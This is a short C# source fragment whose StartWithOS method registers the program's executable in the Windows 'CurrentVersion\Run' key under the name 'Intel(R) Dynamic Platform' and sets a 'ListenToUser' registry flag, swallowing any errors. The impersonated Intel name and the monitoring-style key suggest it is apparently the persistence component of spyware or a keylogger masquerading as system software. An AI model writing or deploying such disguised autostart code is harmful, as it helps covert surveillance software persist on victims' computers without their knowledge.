using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Intel_R__Dynamic_Platform
{
    partial class Program
    {
       
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("Intel(R) Dynamic Platform", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {
            }
        }
       
    }
}
